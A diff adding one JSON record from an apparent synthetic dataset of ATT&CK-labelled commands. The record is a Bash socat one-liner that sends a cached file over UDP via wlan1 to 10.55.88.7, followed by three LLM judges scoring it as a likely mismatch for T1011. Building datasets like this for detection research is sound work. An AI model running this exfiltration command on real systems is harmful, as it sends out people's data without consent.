@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && socat -u FILE:/home/user/.cache/k.bin UDP4-SENDTO:10.55.88.7:49401,interface=wlan1",
+  "explanation": "Uses socat to send a file via UDP bound explicitly to wlan1, leveraging a separate wireless medium in line with T1011.",
+  "rationale_steps": [
+    "Confirm wlan1 presence via iwconfig without making changes.",
+    "Select the outbound interface explicitly (wlan1) to ensure off-path exfiltration.",
+    "Use UDP on a non-standard port for a single-shot transfer with minimal system impact."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-c920e182",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash with correct redirection, command chaining, and valid socat address/option syntax.",
+        "semantic_score": 1,
+        "semantic_justification": "It sends a file via UDP over a wireless interface (potentially requiring elevated privileges for SO_BINDTODEVICE), but this is network exfiltration and not exfiltration over a physical medium as defined for T1011.",
+        "combined_score": 3.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T07:28:51.261455Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags, and correct command chaining using the && operator.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt to send data over a wireless interface (wlan1), it's using UDP network transmission rather than a physical medium as described in T1011, which specifically refers to removable storage devices, optical media, or mobile devices.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:28:54.131826Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid Bash syntax, proper redirections, and correct `socat` arguments for sending a file over UDP with interface binding.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command effectively sends data via a wireless network, this action falls under network exfiltration (e.g., T1048) and fundamentally misaligns with T1011 Exfiltration Over Physical Medium, which specifically refers to physical storage devices.",
+        "combined_score": 3.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T07:29:14.312761Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
